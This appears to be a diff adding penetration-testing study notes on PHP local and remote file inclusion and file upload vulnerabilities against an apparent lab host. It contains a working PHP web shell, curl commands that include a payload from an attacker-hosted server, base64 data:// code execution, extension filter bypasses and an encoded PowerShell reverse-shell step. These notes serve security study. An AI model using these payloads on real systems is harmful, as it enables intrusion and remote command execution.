@@ -113,3 +113,50 @@ Same execution result, except there's no `payload.php` anywhere on disk — the 
 	- `curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 		- encoded portion - setter
 		- &cmd=ls - payload
+### remote file inclusion (rfi)
+- this is only enabled with allow_url_include is enabled.
+	- functions enabled:
+		- include()
+		- get://
+- uncommon, limited to data servers 
+#### worked example
+```
+cat simple-backdoor.php
+...
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+...
+```
+- create file hosting server using python to host payload
+	- python -m http.server 80 
+	- alternatively, you can use **file hosting platforms like github**
+- inject into site
+	- `curl "http://mountaindesserts.local/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`
+### File upload vuln
+works with:
+- XXE (xml external entity)
+- [[Cross site scripting|XSS]]
+- user profile picture 
+	- inject with svg file
+- docuement upload
+	- inject with .docx macros
+**php**
+- .php /.phtml might be blocked
+- try .php7 and .phps instead
+- or, abuse case sensitivity.
+	- use .pHp or .pHtMl
+**powershell encoding one liner**
+- use linux powershell to generate a window rev shell using the script win_revshell_hash.sh
+- upload the backdoor and set the command to
+	- powershell -enc \<hash\>
+	- which is html encoded into
+	- powershell%20-enc%20\<hash\>
